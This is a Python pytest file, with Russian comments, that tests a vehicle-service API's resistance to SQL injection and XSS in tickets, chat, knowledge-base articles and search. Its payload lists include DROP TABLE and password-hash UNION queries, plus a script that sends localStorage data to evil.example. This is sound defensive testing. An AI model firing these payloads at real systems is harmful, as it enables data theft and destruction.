"""SQL-инъекции и XSS в тикетах, чате, базе знаний и поиске (Глава 25, ADR 0029 п. 10).

SQL — только ORM и параметры (LIKE экранируется): нагрузки в тексте и поиске — обычные строки,
не 500, не расширяют выборку и хранятся как есть. XSS: API хранит текст без изменений (вывод —
дело клиента: веб — текст React, Flutter — Text/MarkdownBody без HTML, проверки — Playwright и
виджет-тест); HTML в статье базы знаний сервер отклоняет (контракт «CommonMark без HTML»).
"""

import pytest

from app.models.enums import UserRole
from tests.api.conftest import API, add_vehicle, error_code
from tests.api.ticket_support import create

SQLI = [
    "' OR '1'='1",
    "'; DROP TABLE ticket; --",
    "1) UNION SELECT phone, password_hash FROM app_user --",
    "%' AND 1=1 --",
    "\\\\'; SELECT pg_sleep(5); --",
    "_%",
]
XSS = [
    "<script>alert(document.cookie)</script>",
    '<img src=x onerror="fetch(`//evil.example/`+localStorage.k)">',
    "javascript:alert(1)",
    '"><svg/onload=alert(1)>',
    "{{constructor.constructor('alert(1)')()}}",
    "[ссылка](javascript:alert(1))",
]


@pytest.fixture
def world(client, as_client, as_staff):
    owner = as_client("+375296710001")
    admin, _ = as_staff("+375296710002", UserRole.ADMIN)
    vehicle = add_vehicle(client, owner)
    return owner, admin, vehicle["id"]


@pytest.mark.parametrize("payload", SQLI + XSS)
def test_ticket_and_chat_store_payload_verbatim(client, world, payload):
    owner, admin, vehicle_id = world
    ticket = create(client, owner, vehicle_id, category="sim", description=payload)
    assert ticket["description"] == payload
    r = client.post(f"{API}/tickets/{ticket['id']}/messages", json={"body": payload}, headers=admin)
    assert r.status_code == 201, r.text
    messages = client.get(f"{API}/tickets/{ticket['id']}/messages", headers=owner).json()["items"]
    assert messages[-1]["body"] == payload


@pytest.mark.parametrize("payload", SQLI)
def test_search_payload_does_not_widen_results(client, world, payload):
    owner, admin, _ = world
    for path, headers in (
        ("/vehicle-models", owner),
        ("/knowledge-articles", owner),
        ("/users", admin),
        ("/tickets", admin),
    ):
        params = {"search": payload[:16]} if path == "/users" else {"search": payload}
        if path == "/tickets":
            params = {"status": payload}  # перечисление: инъекция — 422, а не выборка
        r = client.get(f"{API}{path}", params=params, headers=headers)
        assert r.status_code in (200, 422), (path, r.status_code, r.text)
        if r.status_code == 200:
            assert r.json()["items"] == [], (path, payload)


@pytest.mark.parametrize("payload", XSS)
def test_article_title_stored_verbatim_html_content_rejected(client, world, payload):
    _, admin, _ = world
    body = {"article_type": "guide", "title": payload[:200], "content": "Безопасный текст"}
    r = client.post(f"{API}/knowledge-articles", json=body, headers=admin)
    assert r.status_code == 201, r.text
    assert r.json()["title"] == payload[:200]
    html = "<" in payload and payload[payload.index("<") + 1].isalpha() or "<svg" in payload
    r = client.post(
        f"{API}/knowledge-articles", json={**body, "content": f"Текст {payload}"}, headers=admin
    )
    if html:
        assert (
            r.status_code == 422
            and r.json()["error"]["details"]["fields"][0]["loc"][-1] == "content"
        )
    else:
        assert r.status_code == 201 and r.json()["content"] == f"Текст {payload}"


@pytest.mark.parametrize(
    "content",
    ["Автоссылка <https://ets.by> и <service@ets.by>", "Если 3 < 5 и 7 > 2", "Код `<b>` в коде"],
)
def test_markdown_without_html_is_accepted(client, world, content):
    _, admin, _ = world
    body = {"article_type": "guide", "title": "Статья", "content": content}
    r = client.post(f"{API}/knowledge-articles", json=body, headers=admin)
    expected = 422 if "<b>" in content else 201  # тег и в коде — тег: «без HTML» буквально
    assert r.status_code == expected, r.text


@pytest.mark.parametrize(
    "bad", ["%00", "a%00b", "%1B[2J", "%7F"], ids=["nul", "inner-nul", "esc", "del"]
)
def test_control_chars_in_query_and_path_are_422(client, world, bad):
    """ZAP-1 (глава 25): `?search=%00` давал 500 — NUL уходил в запрос PostgreSQL."""
    owner, admin, vehicle_id = world
    cases = [
        ("GET", f"/vehicle-models?search={bad}", owner),
        ("GET", f"/knowledge-articles?search={bad}", owner),
        ("GET", f"/vehicles/{vehicle_id}/maintenance-records?aggregate_type_code={bad}", owner),
        ("GET", f"/users?search={bad}", admin),
        ("POST", f"/vehicles/{vehicle_id}/aggregate-statuses/{bad}/replace", admin),
    ]
    for method, path, headers in cases:
        body = (
            {"replaced_at": "2026-01-01", "mileage_at_replacement": 0} if method == "POST" else None
        )
        r = client.request(method, f"{API}{path}", json=body, headers=headers)
        assert r.status_code == 422, (method, path, r.status_code, r.text)
    # У deletePushToken в контракте нет 422: такого токена не существует — 404.
    r = client.delete(f"{API}/push-tokens/{bad}", headers=owner)
    assert r.status_code == 404 and error_code(r) == "PUSH_TOKEN_NOT_FOUND"
